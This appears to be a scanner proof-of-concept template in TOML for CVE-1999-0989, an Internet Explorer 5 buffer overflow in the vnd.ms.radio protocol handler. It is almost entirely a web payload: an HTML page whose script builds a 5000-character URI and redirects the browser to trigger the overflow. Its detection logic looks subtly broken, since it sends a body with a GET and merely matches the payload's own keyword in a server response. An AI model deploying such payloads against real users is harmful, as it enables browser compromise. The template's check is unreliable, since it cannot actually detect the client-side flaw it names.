[info]
author = "AVE"
description = "Microsoft Internet Explorer 5 DirectShow 筛选器 MSDXM.OCX 缓冲区溢出漏洞验证。通过 vnd.ms.radio 协议构造超长 URI，在 IE5 解析时触发栈缓冲区溢出，导致远程代码执行。"
id = "POC-AVE-1999-1608"
name = "CVE-1999-0989 PoC"
severity = "high"
tags = [
    "cve-1999-0989",
    "vnd.ms.radio",
    "directshow",
    "msdxm.ocx",
]
vuln_id = [
    "CVE-1999-0989",
    "AVE-1999-1608",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cve-1999-0989.html"
protocol = "http"

[poc.requests.body]
content = '<html><head><title>CVE-1999-0989 PoC</title></head><body><script>var x="A".repeat(5000);location.href="vnd.ms.radio:"+x;</script></body></html>'
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["vnd.ms.radio"]
